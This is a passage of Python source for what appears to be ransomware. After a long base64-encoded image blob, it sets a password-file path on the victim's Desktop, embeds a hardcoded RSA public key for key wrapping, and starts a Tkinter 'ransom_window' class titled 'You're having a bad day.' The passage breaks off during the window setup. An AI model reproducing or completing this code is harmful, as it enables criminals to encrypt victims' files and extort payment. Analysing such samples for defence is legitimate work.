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
'''


user = getpass.getuser()
password_file = 'C:\\Users\\'+ user + '\\Desktop\\password_file.bin'

PubkeyText = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxyuh3MulC6t40uLA3T/S
iYorWNKYl0M9HYBrjNryIN39E1eQJOg6CvfWZA6o8GFYBawBXHDkFy4N6BDlqrc1
rsEiEOpL02j6v1Gz4a+vIER/RvGX2devByMhyzwrUbUYwzqCOoE84OEpLR6XhRqf
QVBganAi3rMriJoIKvPwhAvLd5wavu9I3hKgmwZgfa1hH8LWPWpuey3p9aJoEm5t
oOIKfEQK/62Xp7mMRCHdBdkIwuWMcTvyDGDmhar42vLCcEFy0axskQDY8ONrvQHM
lZPtckdNaVLLQIKhjECiO/Huq9ASE+S7KMrbSoFKjLjohgLXDWmtRuVhd2WVCYfJ
wwIDAQAB
-----END PUBLIC KEY-----'''

Pubkey = RSA.importKey(PubkeyText)

#ransom window function
class ransom_window(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self.title('You\'re having a bad day.')
        self.configure(bg = 'black')
        self.geometry("1000x700")
        self.minsize(1000,700)
        self.maxsize(1000,700)

        self.frame_top = tk.Frame(self, bg = 'black')
        self.frame_top.place(relx = 0, rely = 0, relwidth = .4, relheight = 0.3)
